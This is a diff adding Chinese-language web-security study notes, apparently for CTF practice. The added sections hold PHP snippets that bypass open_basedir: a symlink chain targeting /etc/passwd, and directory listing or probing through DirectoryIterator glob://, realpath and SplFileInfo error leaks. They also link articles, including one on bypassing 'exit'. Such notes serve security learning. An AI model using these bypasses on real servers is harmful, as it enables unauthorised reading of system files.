@@ -308,6 +308,111 @@ scandir,file_get_contents('/proc/...')
 
 
 
+### 绕过open_basedir
+
+ https://www.leavesongs.com/bypass-open-basedir-readfile.html 
+
+ https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html 
+
+ [https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#%E6%96%B9%E5%BC%8F1%E2%80%94%E2%80%94DirectoryIterator-glob](https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/#方式1——DirectoryIterator-glob) 
+
+#### 利用软链接
+
+```php
+<?php
+symlink("abc/abc/abc/abc","tmplink"); 
+symlink("tmplink/../../../etc/passwd", "exploit"); 
+unlink("tmplink"); 
+mkdir("tmplink");
+```
+
+
+
+#### 利用DirectoryIterator + Glob 直接列举目录
+
+
+
+```php
+<?php
+printf('<b>open_basedir : %s </b><br />', ini_get('open_basedir'));
+$file_list = array();
+// normal files
+$it = new DirectoryIterator("glob:///*");
+foreach($it as $f) {
+    $file_list[] = $f->__toString();
+}
+// special files (starting with a dot(.))
+$it = new DirectoryIterator("glob:///.*");
+foreach($it as $f) {
+    $file_list[] = $f->__toString();
+}
+sort($file_list);
+foreach($file_list as $f){
+        echo "{$f}<br/>";
+}
+?>
+```
+
+
+
+
+
+#### realpath列举目录
+
+```php
+ini_set('open_basedir', dirname(__FILE__));
+printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
+set_error_handler('isexists');
+$dir = 'd:/test/';
+$file = '';
+$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
+for ($i=0; $i < strlen($chars); $i++) { 
+    $file = $dir . $chars[$i] . '<><';
+    realpath($file);
+}
+function isexists($errno, $errstr)
+{
+    $regexp = '/File\((.*)\) is not within/';
+    preg_match($regexp, $errstr, $matches);
+    if (isset($matches[1])) {
+        printf("%s <br/>", $matches[1]);
+    }
+}
+?>
+```
+
+
+
+#### SplFileInfo::getRealPath列举目录
+
+```php
+<?php
+ini_set('open_basedir', dirname(__FILE__));
+printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
+$basedir = 'D:/test/';
+$arr = array();
+$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+for ($i=0; $i < strlen($chars); $i++) { 
+    $info = new SplFileInfo($basedir . $chars[$i] . '<><');
+    $re = $info->getRealPath();
+    if ($re) {
+        dump($re);
+    }
+}
+function dump($s){
+    echo $s . '<br/>';
+    ob_flush();
+    flush();
+}
+?>
+```
+
+
+
+
+
+
+
 ## 文件包含漏洞
 
 ### php伪协议
@@ -401,6 +506,14 @@ print(($payload."\n"));
 
 - 关键函数:end(),getallheaders(),pos()
 - `~|^&`等运算符来绕过
+
+
+
+
+
+### 绕过死亡exit
+
+ https://www.leavesongs.com/PENETRATION/php-filter-magic.html 
 
 
 
